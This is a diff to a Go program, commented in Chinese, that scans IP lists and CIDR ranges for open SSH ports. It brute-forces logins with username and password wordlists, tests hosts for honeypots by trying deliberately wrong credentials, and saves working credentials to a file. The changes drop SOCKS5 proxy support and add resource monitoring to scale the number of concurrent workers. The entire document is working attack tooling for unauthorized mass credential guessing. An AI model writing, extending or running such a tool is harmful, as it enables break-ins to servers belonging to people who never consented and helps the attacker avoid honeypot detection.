@@ -11,31 +11,34 @@ import (
 	"sync"
 	"time"
 
+	"github.com/shirou/gopsutil/cpu"
+	"github.com/shirou/gopsutil/mem"
 	"golang.org/x/crypto/ssh"
-	"golang.org/x/net/proxy"
 )
 
 const (
-	port        = "22"
-	timeout     = 3 * time.Second
-	ipFilename  = "ip.txt"
-	userFile    = "user.txt"
-	passFile    = "passwd.txt"
-	resultFile  = "success.txt"
-	scanWorkers = 5000
-	authWorkers = 2000
+	port       = "22"
+	timeout    = 3 * time.Second
+	ipFilename = "ip.txt"
+	userFile   = "user.txt"
+	passFile   = "passwd.txt"
+	resultFile = "success.txt"
 )
 
 var (
-	useProxy   bool
-	socks5Addr string
+	baseScanWorkers = 500
+	baseAuthWorkers = 200
+	maxWorkers      = 10000
+
+	scanWorkerCh = make(chan int, 1)
+	authWorkerCh = make(chan int, 1)
 )
 
 func init() {
-	flag.BoolVar(&useProxy, "proxy", false, "是否使用 SOCKS5 代理")
-	flag.StringVar(&socks5Addr, "proxyAddr", "127.0.0.1:1080", "SOCKS5 代理地址")
 	flag.Parse()
 	rand.Seed(time.Now().UnixNano())
+	scanWorkerCh <- baseScanWorkers
+	authWorkerCh <- baseAuthWorkers
 }
 
 func main() {
@@ -56,21 +59,24 @@ func main() {
 
 	var scanWg, authWg sync.WaitGroup
 
-	// 啟動掃描池
+	// 啟動監控系統資源
+	go monitorAndAdjust()
+
+	// 掃描任務
 	go func() {
 		startScanPool(ipChan, openIPs, &scanWg)
-		scanWg.Wait() // 等待所有掃描任務結束
+		scanWg.Wait()
 		close(openIPs)
 	}()
 
-	// 啟動認證池
+	// 認證任務
 	go func() {
 		startAuthPool(openIPs, users, passwords, success, &authWg)
-		authWg.Wait() // 等待所有認證任務結束
+		authWg.Wait()
 		close(success)
 	}()
 
-	// 處理結果
+	// 寫入成功結果
 	out, err := os.OpenFile(resultFile, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
 	if err != nil {
 		fmt.Println("無法寫入結果文件:", err)
@@ -86,51 +92,73 @@ func main() {
 	fmt.Println("掃描結束")
 }
 
+func monitorAndAdjust() {
+	ticker := time.NewTicker(1 * time.Second)
+	defer ticker.Stop()
+
+	for range ticker.C {
+		cpuPercents, _ := cpu.Percent(0, false)
+		memStats, _ := mem.VirtualMemory()
+		cpuUsage := cpuPercents[0]
+		memUsage := memStats.UsedPercent
+
+		fmt.Printf("[監控] CPU: %.2f%%, MEM: %.2f%%\n", cpuUsage, memUsage)
+
+		if cpuUsage > 80 || memUsage > 80 {
+			scanWorkerCh <- max(baseScanWorkers/2, 100)
+			authWorkerCh <- max(baseAuthWorkers/2, 50)
+		} else {
+			scanWorkerCh <- min(baseScanWorkers*2, maxWorkers)
+			authWorkerCh <- min(baseAuthWorkers*2, maxWorkers)
+		}
+	}
+}
+
 func startScanPool(ipChan <-chan string, openIPs chan<- string, wg *sync.WaitGroup) {
-	for i := 0; i < scanWorkers; i++ {
-		wg.Add(1)
-		go func() {
-			defer wg.Done()
-			for ip := range ipChan {
-				if isOpen(ip, port) {
-					openIPs <- ip
-				} else {
-					fmt.Printf("[-] %s 無法連接 22 端口\n", ip)
-				}
+	for {
+		select {
+		case count := <-scanWorkerCh:
+			fmt.Println("[更新] 掃描併發數調整為:", count)
+			for i := 0; i < count; i++ {
+				wg.Add(1)
+				go func() {
+					defer wg.Done()
+					for ip := range ipChan {
+						if isOpen(ip, port) {
+							openIPs <- ip
+						} else {
+							fmt.Printf("[-] %s 無法連接 22 端口\n", ip)
+						}
+					}
+				}()
 			}
-		}()
+			return
+		}
 	}
 }
 
 func startAuthPool(openIPs <-chan string, users, passwords []string, success chan<- string, wg *sync.WaitGroup) {
-	for i := 0; i < authWorkers; i++ {
-		wg.Add(1)
-		go func() {
-			defer wg.Done()
-			for ip := range openIPs {
-				if loginSSH(ip, users, passwords, success) {
-					// 如果某個IP驗證成功後就不再嘗試其它組合，直接處理下一個 IP
-					continue
-				}
+	for {
+		select {
+		case count := <-authWorkerCh:
+			fmt.Println("[更新] 登錄併發數調整為:", count)
+			for i := 0; i < count; i++ {
+				wg.Add(1)
+				go func() {
+					defer wg.Done()
+					for ip := range openIPs {
+						if loginSSH(ip, users, passwords, success) {
+							continue
+						}
+					}
+				}()
 			}
-		}()
+			return
+		}
 	}
-}
-
-func getDialer() (proxy.Dialer, error) {
-	if useProxy {
-		return proxy.SOCKS5("tcp", socks5Addr, nil, proxy.Direct)
-	}
-	return proxy.Direct, nil
 }
 
 func loginSSH(ip string, users, passwords []string, success chan<- string) bool {
-	dialer, err := getDialer()
-	if err != nil {
-		fmt.Println("代理 dialer 錯誤:", err)
-		return false
-	}
-
 	for _, user := range users {
 		for _, pass := range passwords {
 			config := &ssh.ClientConfig{
@@ -139,7 +167,7 @@ func loginSSH(ip string, users, passwords []string, success chan<- string) bool 
 				HostKeyCallback: ssh.InsecureIgnoreHostKey(),
 				Timeout:         timeout,
 			}
-			conn, err := dialer.Dial("tcp", net.JoinHostPort(ip, port))
+			conn, err := net.DialTimeout("tcp", net.JoinHostPort(ip, port), timeout)
 			if err != nil {
 				continue
 			}
@@ -150,13 +178,11 @@ func loginSSH(ip string, users, passwords []string, success chan<- string) bool 
 				continue
 			}
 			client := ssh.NewClient(sshConn, chans, reqs)
-			// 成功登入，開始進行蜜罐檢測（錯誤帳密嘗試3次）
+
 			honeypotCount := 0
 			for i := 0; i < 3; i++ {
-				// 隨機挑選一個帳密
 				fakeUser := users[rand.Intn(len(users))]
 				fakePass := passwords[rand.Intn(len(passwords))]
-				// 如果隨機到的與原本成功的相同則修改密碼確保錯誤
 				if fakeUser == user && fakePass == pass {
 					fakePass = fakePass + "_wrong"
 				}
@@ -166,13 +192,12 @@ func loginSSH(ip string, users, passwords []string, success chan<- string) bool 
 					HostKeyCallback: ssh.InsecureIgnoreHostKey(),
 					Timeout:         timeout,
 				}
-				fakeConn, err := dialer.Dial("tcp", net.JoinHostPort(ip, port))
+				fakeConn, err := net.DialTimeout("tcp", net.JoinHostPort(ip, port), timeout)
 				if err != nil {
 					continue
 				}
 				fakeSSHConn, _, _, err := ssh.NewClientConn(fakeConn, net.JoinHostPort(ip, port), fakeConfig)
 				if err == nil {
-					// 測試成功的次數累加
 					honeypotCount++
 					fmt.Printf("[!] %s 測試 %d/3 錯誤登入成功 (%s/%s)\n", ip, i+1, fakeUser, fakePass)
 					fakeSSHConn.Close()
@@ -233,7 +258,6 @@ func readIPFile(filename string) <-chan string {
 		}
 		for _, line := range lines {
 			if ip, ipnet, err := net.ParseCIDR(line); err == nil {
-				// 對於 CIDR 格式，每一個 IP 都要加入到 channel
 				for ip := ip.Mask(ipnet.Mask); ipnet.Contains(ip); inc(ip) {
 					out <- ip.String()
 				}
@@ -254,5 +278,18 @@ func inc(ip net.IP) {
 			break
 		}
 	}
+}
+
+func min(a, b int) int {
+	if a < b {
+		return a
+	}
+	return b
+}
+func max(a, b int) int {
+	if a > b {
+		return a
+	}
+	return b
 }
 
